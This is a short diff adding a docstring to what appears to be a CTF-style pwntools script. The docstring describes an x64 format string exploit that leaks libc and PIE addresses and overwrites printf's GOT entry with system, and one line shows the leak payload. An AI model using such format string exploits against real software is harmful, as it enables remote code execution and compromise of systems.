@@ -1,3 +1,18 @@
+"""
+x64 basic format string write exploit.
+
+Category: Pwn > Format String
+
+Description:
+    Simple format string exploit that leaks libc and PIE addresses, then
+    overwrites printf GOT with system using fmtstr_payload.
+
+Usage:
+    python fmt_write.py
+
+Dependencies:
+    - pwntools
+"""
 r = conn()
 
 r.sendline(b"%3$p|%33$p")
